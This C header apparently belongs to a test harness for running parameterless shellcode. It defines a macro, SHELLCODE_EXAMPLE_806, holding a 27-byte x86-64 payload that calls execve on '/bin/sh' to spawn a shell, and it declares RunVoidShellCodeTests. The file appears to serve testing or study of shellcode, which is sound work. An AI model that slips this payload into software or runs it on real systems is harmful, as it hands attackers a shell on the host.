// void_shellcode_tests.h - Defines the interface for the shellcode tests
// that execute shellcode that does not take any parameters and returns
// nothing
//

#ifndef __VOID_SHELLCODE_TESTS_H__
#define __VOID_SHELLCODE_TESTS_H__

#ifndef SHELLCODE_EXAMPLE_806
#define SHELLCODE_EXAMPLE_806 \
  "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f" \
  "\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#endif //SHELLCODE_EXAMPLE_806

void RunVoidShellCodeTests();

#endif //__VOID_SHELLCODE_TESTS_H__
